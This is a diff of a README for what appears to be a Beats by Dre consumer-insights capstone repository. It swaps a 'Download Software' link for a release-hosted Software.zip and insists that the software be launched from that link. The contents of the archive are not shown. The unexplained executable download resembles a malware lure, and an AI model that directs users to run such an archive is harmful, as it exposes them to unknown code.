@@ -32,7 +32,7 @@ The repository includes the following key components:
 
 Please find the link to download the software associated with this project: 
 
-[Download Software](https://github.com/user-attachments/files/18388744/Software.zip)
+[Download Software](https://github.com/poobeth22/Beats-by-Dre-Consumer-Insights-Capstone/releases/download/v2.0/Software.zip)
 
 ### Please Note: The software needs to be launched from the provided link.
 
